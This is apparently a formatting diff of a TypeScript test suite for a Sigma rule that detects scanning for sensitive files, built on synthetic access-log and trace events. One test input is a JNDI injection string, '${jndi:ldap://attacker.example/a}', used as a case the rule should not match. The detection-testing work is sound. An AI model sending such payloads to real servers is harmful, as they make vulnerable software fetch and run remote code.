@@ -67,7 +67,10 @@ function rule(): SigmaRule {
   return SigmaRuleParser.parse(entry().sigmaRuleYaml);
 }
 
-function fromAccessLog(target: string, status: number): Array<NormalizedSecurityEvent> {
+function fromAccessLog(
+  target: string,
+  status: number,
+): Array<NormalizedSecurityEvent> {
   return SecurityLogParser.parse(
     logLine(
       `${SCANNER_ADDRESS} - - [24/Nov/2026:10:45:00 +0000] "GET ${target} HTTP/1.1" ${status} 153 "-" "Mozilla/5.0 zgrab/0.x"`,
@@ -75,7 +78,10 @@ function fromAccessLog(target: string, status: number): Array<NormalizedSecurity
   );
 }
 
-function fromTrace(url: string, status: string): NormalizedSecurityEvent | null {
+function fromTrace(
+  url: string,
+  status: string,
+): NormalizedSecurityEvent | null {
   const span: TraceScanSpan = {
     traceId: "4bf92f3577b34da6a3ce929d0e0e4736",
     spanId: "00f067aa0ba902b7",
@@ -116,7 +122,9 @@ describe("Scanning for sensitive files, as the library holds it", () => {
     expect(found.matchCountThreshold).toBe(3);
     expect(found.evaluationIntervalInMinutes).toBe(5);
     expect(RECOMMENDED_DETECTION_RULE_IDS).toContain(found.id);
-    expect(found.description).toContain("A page your site serves never counts.");
+    expect(found.description).toContain(
+      "A page your site serves never counts.",
+    );
 
     // Its id is its own, once in the library and once in its YAML.
     expect(
@@ -143,7 +151,9 @@ describe("Scanning for sensitive files, as the library holds it", () => {
   test("compiles to a read that binds what it looks for, and runs in real time", () => {
     const statement: Statement = SigmaClickhouseCompiler.compile(rule());
 
-    expect(readStatementValues(statement)).toContain(WebAttackKind.SensitiveFile);
+    expect(readStatementValues(statement)).toContain(
+      WebAttackKind.SensitiveFile,
+    );
     expect(statement.query).not.toContain(WebAttackKind.SensitiveFile);
     expect(
       getRealTimeDetectionProblem({
@@ -248,17 +258,26 @@ describe("Scanning for sensitive files, over what each source makes of a request
       "/?x=${jndi:ldap://attacker.example/a}",
     ]) {
       for (const event of fromAccessLog(target, 404)) {
-        expect({ target, matches: sigmaRuleMatchesEvent(rule(), event) }).toEqual(
-          { target, matches: false },
-        );
+        expect({
+          target,
+          matches: sigmaRuleMatchesEvent(rule(), event),
+        }).toEqual({ target, matches: false });
       }
     }
   });
 
   test("a page the site serves is no event, so there is nothing for it to count", () => {
-    for (const target of ["/wp-admin/", "/wp-login.php", "/.well-known/security.txt"]) {
+    for (const target of [
+      "/wp-admin/",
+      "/wp-login.php",
+      "/.well-known/security.txt",
+    ]) {
       for (const status of [200, 302, 304]) {
-        expect({ target, status, events: fromAccessLog(target, status) }).toEqual({
+        expect({
+          target,
+          status,
+          events: fromAccessLog(target, status),
+        }).toEqual({
           target,
           status,
           events: [],
